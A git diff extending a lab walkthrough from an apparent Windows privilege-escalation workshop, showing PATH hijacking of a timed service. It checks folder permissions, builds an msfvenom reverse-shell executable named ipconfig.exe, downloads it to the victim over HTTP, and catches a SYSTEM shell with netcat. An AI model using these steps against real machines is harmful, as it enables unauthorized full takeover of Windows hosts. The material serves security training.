@@ -775,7 +775,7 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 Then we transfer the file over:
 
 ````
-Copy-Item "C:\Users\user\Downloads\PathHijackService.exe" -Destination "\\10.22.6.122\Shared\PathHijackService.exe"
+Copy-Item "C:\Users\user\Downloads\PathHijackService.exe" -Destination "\\YOURIPHERE\Shared\PathHijackService.exe"
 
 ````
 Coincidentally we also got the user hash, so we should try to crack that at some point.
@@ -786,5 +786,88 @@ Let's use r2 to look at the service (I won't try to summarize using r2, that's h
 
 We can eventually find that the service is starting "ipconfig.exe" on a timer.
 
+[![r2image](https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/LPEWorkshopImages/r2.JPG)]
 
+This means that if there is a PATH vulnerability we can inject our malicious ``ipconfig.exe`` into the PATH and get it executed instead of the legit binary.
 
+Let's check the PATH variable from our previous scripts:
+````
+=== System Environment Variables ===
+
+  ComSpec                             : C:\Windows\system32\cmd.exe
+  FP_NO_HOST_CHECK                    : NO
+  NUMBER_OF_PROCESSORS                : 1
+  OS                                  : Windows_NT
+  Path                                : C:\DevTools;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Temp;C:\Temp
+  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+  PROCESSOR_ARCHITECTURE              : x86
+  PROCESSOR_IDENTIFIER                : x86 Family 6 Model 60 Stepping 3, GenuineIntel
+  PROCESSOR_LEVEL                     : 6
+  PROCESSOR_REVISION                  : 3c03
+  PSModulePath                        : C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+  TEMP                                : C:\Windows\TEMP
+  TMP                                 : C:\Windows\TEMP
+  USERNAME                            : SYSTEM
+  windir                              : C:\Windows
+  windows_tracing_flags               : 3
+  windows_tracing_logfile             : C:\BVTBin\Tests\installpackage\csilogfile.log
+````
+
+We can see that C:\DevTools is first in the path. If we can control C:\DevTools and drop a malicious binary named ipconfig.exe into it, we will get our malicious payload executed.
+
+Let's check permissions:
+
+````
+PS C:\> icacls.exe DevTools
+DevTools BUILTIN\Users:(OI)(CI)(F)
+         BUILTIN\Administrators:(I)(F)
+         BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+         BUILTIN\Users:(I)(OI)(CI)(RX)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\> 
+````
+We have full control!
+
+So now we create our payload:
+
+````
+root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe > ipconfig.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+````
+
+We transfer it to our victim host:
+
+````
+PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/ipconfig.exe", "C:\DevTools\ipconfig.exe")
+PS C:\> 
+````
+
+Now we wait for the service to call our malicious executable.
+
+And we get a shell as NT\Authority System
+````
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.49.
+Ncat: Connection from 10.22.6.49:52119.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami & hostname
+whoami & hostname
+nt authority\system
+LPETestbed
+
+C:\Windows\system32>
+````
